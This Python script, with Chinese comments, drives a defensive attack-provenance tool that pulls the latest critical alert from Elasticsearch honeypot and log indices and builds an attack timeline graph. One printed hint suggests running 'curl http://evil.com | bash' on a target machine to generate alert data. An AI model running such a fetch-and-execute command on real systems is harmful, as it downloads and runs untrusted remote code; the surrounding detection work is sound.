# run_real_analysis.py
import sys
import os
import json
import logging
from elasticsearch import Elasticsearch # 确保安装了 pip install elasticsearch

# 确保能找到项目模块
sys.path.append(os.getcwd())

from analyzer.attack_analyzer.context_engine import ContextEngine
from analyzer.graph_analyzer.provenance_system import ProvenanceSystem

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def main():
    print("🚀 启动实战模式：连接真实 Elasticsearch...")

    # 1. 连接真实的 ES (请根据实际情况修改 IP)
    es_client = Elasticsearch(["http://localhost:9200"])
    
    if not es_client.ping():
        print("❌ 无法连接到 Elasticsearch！请检查服务。")
        return
    print("✅ Elasticsearch 连接成功！")

    # 2. 初始化真实的引擎 (不再是 Mock!)
    # ContextEngine 会直接使用上面的 es_client 去查库
    context_engine = ContextEngine(es_client)
    
    # 3. 初始化溯源系统
    system = ProvenanceSystem(context_engine)

    # 4. 从数据库里找一个高危告警作为种子 (Seed)
    # 这里我们模拟去搜一个 Severity=Critical 的告警，或者你可以手动指定一个 ID
    print("🔍 正在从数据库搜索最近的高危告警...")
    
    query = {
        "query": {
            "bool": {
                "should": [
                    {"term": {"detection.severity": "critical"}},
                    {"term": {"event.severity": 10}}, # 兼容组员1
                    {"term": {"event.severity": 8}}   # 兼容 Cowrie
                ],
                "minimum_should_match": 1
            }
        },
        "size": 1,
        "sort": [{"@timestamp": "desc"}]
    }
    
    res = es_client.search(index="unified-logs*,honeypot-logs*,network-flows*", body=query)
    
    if len(res['hits']['hits']) == 0:
        print("⚠️ 数据库里没找到高危告警。")
        print("💡 建议：先去靶机上跑几个攻击命令（如 curl http://evil.com | bash）产生点数据。")
        return

    seed_doc = res['hits']['hits'][0]['_source']
    print(f"🎯 锁定种子事件 ID: {seed_doc.get('event', {}).get('id')}")
    print(f"   摘要: {seed_doc.get('message') or seed_doc.get('process', {}).get('command_line')}")

    # 5. 开始溯源分析 (这时 context_engine 会真的去 ES 查关联数据)
    print("running 🕵️‍♂️ 正在执行关联分析与图谱构建...")
    result = system.rebuild_attack_path(seed_doc)

    # 6. 输出结果
    print("\n" + "="*60)
    print("📊 实战溯源报告")
    print("="*60)
    print(system.format_attack_timeline(result))
    
    # 保存结果
    with open("real_attack_graph.json", "w") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    print(f"💾 完整图谱数据已保存至 real_attack_graph.json")

if __name__ == "__main__":
    main()
